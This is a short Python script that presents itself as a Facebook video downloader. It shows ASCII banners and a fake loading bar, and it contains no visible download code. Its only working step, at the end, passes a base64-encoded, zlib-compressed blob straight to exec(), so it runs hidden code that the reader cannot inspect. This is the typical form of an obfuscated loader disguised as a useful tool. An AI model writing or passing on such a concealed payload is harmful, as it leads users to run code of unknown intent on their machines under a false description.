#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import sys
import os
import re, time
import requests as r
from os import system
import wget, gzip, lzma, base64, zlib

os.system('cls' if os.name == 'nt' else 'clear')
system(
    "mode con: cols=72 lines=27" if os.name == "nt" else "resize -s 90 150 > /dev/null"
)

def start_banner():
    pass
    print(
        r"""
                                                
            `7MMMMMYMM    `7MMF'   `7MF'   `7MMMMMYb.   
              MM    `7      `MA     ,V       MM    `Yb. 
              MM   d         VM:   ,V        MM     `Mb 
              MM""MM          MM.  M'        MM      MM 
              MM   Y          `MM A'         MM     ,MP 
              MM       ,,      :MM;     ,,   MM    ,dP' 
            .JMML.     db       VF      db .JMMmmmdP'   

         [  FACEBOOK           VIDEO         DOWNLOADER   ]
        """

    )                   
    print("\n\n\t\t     >>>   Made By Aniket   <<< ")
#    print("\t\t     ___________________________")
    print("\n")
    print("    \t\t\t      Loading:      ")

    
    animation = ["[■□□□□□□□□□]","[■■□□□□□□□□]", "[■■■□□□□□□□]", "[■■■■□□□□□□]", "[■■■■■□□□□□]", "[■■■■■■□□□□]", "[■■■■■■■□□□]", "[■■■■■■■■□□]", "[■■■■■■■■■□]", "[■■■■■■■■■■]"]
    print("\n\n")
    for i in range(len(animation)):
        time.sleep(0.4)
        sys.stdout.write("   \r\t\t\t    " + animation[i % len(animation)])
        sys.stdout.flush()
    print("\n")
                     
                                            
start_banner()



os.system('cls' if os.name == 'nt' else 'clear')
def menu_banner():
    pass
    print(
        r"""       
                  _               _  
                 |_     \  /     | \ 
                 |   o   \/   o  |_/ 

        [    Facebook  Video  Downloader   ]
        """
    )             

system(
    "mode con: cols=78 lines=27" if os.name == "nt" else "resize -s 90 150 > /dev/null"
)
menu_banner()
exec(zlib.decompress(base64.b64decode('eJztVWtv2jAU/e5fcRtNSrKmkWi3fahkTRXNCloHjNLHRKvJIQbcBjvYDq9fPzsJj3Z00rRpnxYhcnN97vHx9XHCJpmQGtRSoQxnknGNOGY8yzWK8Ge6jAWRSZNrKmWeaaTw1VJpOokWTKMY95YZjaQUEuXYUIRKJ8JUsuKBWgwr+YVCZ1iokJMJRec2UgUPatk4I3qMLmw0onowT9ZVkgaamYIZtrdQpZRmaIylCSmRg/EWN82p0gqIAokaWIbdMhMtBjTTTHDUNMmeIbHybk1cF5zTgR0q9S9MzkyOhlJMjFpgm75YldXT3CCC0YplQbqakCAmin54F6xSFqME28EwEXOeCpKgO3zh+aiNW+GjYNy789ENdu8Xtbh//NlFmefc83vu+CihQ5h7/ikCm9NHP1+fyIDGQjzBDUuogPNqBir3YA0hlNwaoBZuwHAp5tClSqS5XXJJtQYb6PEOtMFG41exBfFJCHb/d3J7pLx97dov2/Sg7IqJO5h7zhuAqNWLuvCtfd2FeqPdrEenYEbZEDoYOzXH9EzLpfmHqS2IrEmBwIt+dYTScN29LGoBhnjhTW1Qx2PPVcl3JQenjhcefvQdNxiGmi603689IKCFd+DWmoraWYy8drtzdXAAW/NA4Z7QUlf45h58ZbwSvINt7MFeUE4lSUssmF+Tz0jKEruGbakXBcpfFz6BeApgmjOtGR8Vy2RebTtNXAHLhnwhS+hINiOa7qNPVSHoEddDSbPUNHPbJjdwXb/kKjaqiFpCTozer7mh0UvT5sNHO3LuuYNUuWC26wxjl2u34AaTNWd3S1Odg/JJ9w8fqn270kRqmmx8uV7Z86LEewzaNsjDuWSaejfP9f2OCmvkA7MD5fzrk2wkmGRBNvPel731EU0rGx7/oQ171obj/zZsJDCjUtm1cKGBzFhK4pTuWnKFe1tLjn9lyeIVtmPI1b805OqvGvKlGV814olTfkPsm7mUVvXN5PpHD5v9E8X30Br6B5KhV4c=')))